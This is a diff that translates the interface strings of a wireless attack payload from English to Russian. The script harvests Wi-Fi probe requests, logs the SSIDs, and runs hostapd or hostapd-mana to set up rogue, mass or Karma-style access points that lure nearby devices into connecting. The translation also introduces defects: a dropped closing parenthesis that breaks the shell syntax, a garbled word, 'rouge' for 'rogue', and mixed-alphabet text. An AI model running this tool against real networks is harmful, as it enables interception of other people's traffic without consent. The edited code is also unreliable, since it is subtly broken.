@@ -12,22 +12,22 @@ nullsec_require_iface || exit 1
 LOOT_DIR="/mmc/nullsec/probeattack"
 mkdir -p "$LOOT_DIR"
 
-PROMPT "PROBE ATTACK
+PROMPT "АТАКА НА PROBE-ЗАПРОСЫ
 
-Capture probe requests
-and create matching APs
-to lure clients.
+Перевыхватите probe-запросы
+и создавайте соответствующие
+AP для привлечения клиентов.
 
-Features:
-- Probe request capture
-- Auto AP creation
-- Client association log
-- SSID harvesting
-- Karma-style response
+Возможности:
+- Перехват probe-запросов
+- Автосоздание AP
+- Логирование клиентов
+- Сбор SSID
+- Karma-стиль ответ
 
-WARNING: Active attack.
+ВНИМАНИЕ: Активная атака.
 
-Press OK to configure."
+Нажмите OK для настройки."
 
 # Check dependencies
 MISSING=""
@@ -35,9 +35,9 @@ command -v airodump-ng >/dev/null 2>&1 || MISSING="${MISSING}aircrack-ng "
 command -v hostapd >/dev/null 2>&1 || command -v hostapd-mana >/dev/null 2>&1 || MISSING="${MISSING}hostapd "
 
 if [ -n "$MISSING" ]; then
-    ERROR_DIALOG "Missing tools: $MISSING
+    ERROR_DIALOG "Отсутствуют инструменты: $MISSING
 
-Install with opkg."
+Установите через opkg."
     exit 1
 fi
 
@@ -46,7 +46,7 @@ MONITOR_IF=""
 for iface in wlan1mon wlan2mon mon0; do
     [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
 done
-[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "No monitor interface!
+[ -z "$MONITOR_IF" ] && { ERROR_DIALOG "Нет интерфейса монитора!
 
 airmon-ng start wlan1"; exit 1; }
 
@@ -57,41 +57,41 @@ for iface in $IFACE wlan2; do
 done
 [ -z "$AP_IFACE" ] && AP_IFACE="$IFACE"
 
-PROMPT "ATTACK MODE:
+PROMPT "РЕЖИМ АТАКИ:
 
-1. Passive probe harvest
-2. Targeted AP creation
-3. Mass AP (top probes)
-4. Karma (respond to all)
+1. Пассивный сбор проб
+2. Целевое создание AP
+3. Массовые AP (топ-пробы)
+4. Karma (ответ всем)
 
-Monitor: $MONITOR_IF
-AP iface: $AP_IFACE
+Мониторинг: $MONITOR_IF
+AP интерфейс: $AP_IFACE
 
-Выберите следующий режим."
+Выберите режим."
 
 ATTACK_MODE=$(NUMBER_PICKER "Режим (1-4):" 1)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) ATTACK_MODE=1 ;; esac
 
-SCAN_DURATION=$(NUMBER_PICKER "Scan time (seconds):" 30)
+SCAN_DURATION=$(NUMBER_PICKER "Время сканирования (сек):" 30)
 case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) SCAN_DURATION=30 ;; esac
 
-resp=$(CONFIRMATION_DIALOG "START PROBE ATTACK?
+resp=$(CONFIRMATION_DIALOG "ЗАПУСТИТЬ АТАКУ НА PROBE?
 
 Режим: $ATTACK_MODE
-Scan: ${SCAN_DURATION}s
-Monitor: $MONITOR_IF
+Сканирование: ${SCAN_DURATION}с
+Мониторинг: $MONITOR_IF
 AP: $AP_IFACE
 
-Confirm?")
+Подтвердить?"
 [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
 
 TIMESTAMP=$(date +%Y%m%d_%H%M)
 PROBE_LOG="$LOOT_DIR/probes_$TIMESTAMP.log"
 CLIENT_LOG="$LOOT_DIR/clients_$TIMESTAMP.log"
 
-# Phase 1: Capture probe requests
-LOG "Capturing probe requests..."
-SPINNER_START "Listening for probes..."
+# Этап 1: Перехват probe-запросов
+LOG "Перехват probe-запросов..."
+SPINNER_START "Прослушивание probe-запросов..."
 
 PROBE_FILE="/tmp/probes_$$"
 timeout "$SCAN_DURATION" tcpdump -i "$MONITOR_IF" -e -s 256 type mgt subtype probe-req 2>/dev/null | \
@@ -112,33 +112,33 @@ TOP_PROBES=$(head -10 "$PROBE_FILE")
 # Save probe log
 cp "$PROBE_FILE" "$PROBE_LOG"
 
-PROMPT "PROBES CAPTURED: $PROBE_COUNT
+PROMPT "PROBE-ЗАПРОСЫ ПЕРЕХВАЧЕНЫ: $PROBE_COUNT
 
-Top requested SSIDs:
+Топ запрашиваемых SSID:
 $TOP_PROBES
 
-Press OK to continue."
+Нажмите OK для продолжения."
 
 case $ATTACK_MODE in
     1) # Passive harvest only
-        PROMPT "PROBE HARVEST DONE
+        PROMPT "СБОР PROBE ЗАВЕРШЁН
 
-Captured $PROBE_COUNT
-unique SSIDs from
-client probes.
+Перевыхвачено $PROBE_COUNT
+уникальных SSID от
+клиентских probe-запросов.
 
-Saved: $PROBE_LOG
+Сохранено: $PROBE_LOG
 
-Press OK to exit."
+Нажмите OK для выхода."
         ;;
 
     2) # Targeted AP creation
-        TARGET_SSID=$(TEXT_PICKER "SSID to spoof:" "$(head -1 "$PROBE_FILE" | awk '{$1=""; print}' | xargs)")
+        TARGET_SSID=$(TEXT_PICKER "SSID для подделки:" "$(head -1 "$PROBE_FILE" | awk '{$1=""; print}' | xargs)")
         case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac
 
-        SPINNER_START "Creating rogue AP..."
+        SPINNER_START "Создание rouge AP..."
 
-        # Configure hostapd
+        # Конфигурация hostapd
         HOSTAPD_CONF="/tmp/probe_hostapd_$$.conf"
         cat > "$HOSTAPD_CONF" << EOF
 interface=$AP_IFACE
@@ -152,25 +152,25 @@ EOF
         HOSTAPD_PID=$!
         SPINNER_STOP
 
-        PROMPT "ROGUE AP ACTIVE
+        PROMPT "ROUGE AP АКТИВНА
 
 SSID: $TARGET_SSID
 Интерфейс: $AP_IFACE
 
-Waiting for clients
-to connect...
+Ожидание подключения
+клиентов...
 
-Press OK to stop."
+Нажмите OK для остановки."
 
         kill $HOSTAPD_PID 2>/dev/null
         rm -f "$HOSTAPD_CONF"
         ;;
 
-    3) # Mass AP - top probed SSIDs
-        MAX_APS=$(NUMBER_PICKER "Max APs (1-5):" 3)
+    3) # Массовые AP - топ probe-запрашиваемых SSID
+        MAX_APS=$(NUMBER_PICKER "Макс AP (1-5):" 3)
         case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) MAX_APS=3 ;; esac
 
-        SPINNER_START "Creating multiple APs..."
+        SPINNER_START "Создание нескольких AP..."
 
         HOSTAPD_CONF="/tmp/probe_mass_$$.conf"
         SSID_LIST=""
@@ -183,7 +183,7 @@ Press OK to stop."
             COUNT=$((COUNT + 1))
         done < "$PROBE_FILE"
 
-        # Use first SSID for single AP (multi-SSID requires special setup)
+        # Использование первого SSID для одной AP (multi-SSID требует спецнастройки)
         FIRST_SSID=$(echo -e "$SSID_LIST" | head -1)
         cat > "$HOSTAPD_CONF" << EOF
 interface=$AP_IFACE
@@ -196,21 +196,21 @@ EOF
         HOSTAPD_PID=$!
         SPINNER_STOP
 
-        PROMPT "MASS AP ACTIVE
+        PROMPT "МАССОВЫЕ AP АКТИВНЫ
 
-Broadcasting SSIDs:
+Вещание SSID:
 $(echo -e "$SSID_LIST" | head -5)
 
-Waiting for clients...
+Ожидание клиентов...
 
-Press OK to stop."
+Нажмите OK для остановки."
 
         kill $HOSTAPD_PID 2>/dev/null
         rm -f "$HOSTAPD_CONF"
         ;;
 
-    4) # Karma mode
-        SPINNER_START "Starting Karma attack..."
+    4) # Режим Karma
+        SPINNER_START "Запуск атаки Karma..."
 
         if command -v hostapd-mana >/dev/null 2>&1; then
             KARMA_CONF="/tmp/karma_$$.conf"
@@ -226,7 +226,7 @@ EOF
             hostapd-mana "$KARMA_CONF" -B 2>/dev/null
             KARMA_PID=$!
         else
-            # Fallback: create open AP with common SSID
+            # Запасной вариант: создание открытой AP с обычным SSID
             KARMA_CONF="/tmp/karma_$$.conf"
             cat > "$KARMA_CONF" << EOF
 interface=$AP_IFACE
@@ -240,28 +240,28 @@ EOF
         fi
         SPINNER_STOP
 
-        PROMPT "KARMA ATTACK ACTIVE
+        PROMPT "АТАКА KARMA АКТИВНА
 
-Responding to all
-probe requests.
+Ответ на все
+probe-запросы.
 
-Clients will auto-
-connect to our AP.
+Клиенты автоматически
+подключатся к нашей AP.
 
-Press OK to stop."
+Нажмите OK для остановки."
 
         kill $KARMA_PID 2>/dev/null
         rm -f "$KARMA_CONF"
         ;;
 esac
 
-# Cleanup
+# Очистка
 rm -f "$PROBE_FILE" "${AIRODUMP_CSV}"*
 
-PROMPT "PROBE ATTACK DONE
+PROMPT "АТАКА НА PROBE ЗАВЕРШЕНА
 
-Probes harvested: $PROBE_COUNT
-Logs saved to:
+Пeреxвачено probe-запросов: $PROBE_COUNT
+Логи сохранены в:
 $LOOT_DIR/
 
-Press OK to exit."
+Нажмите OK для выхода."
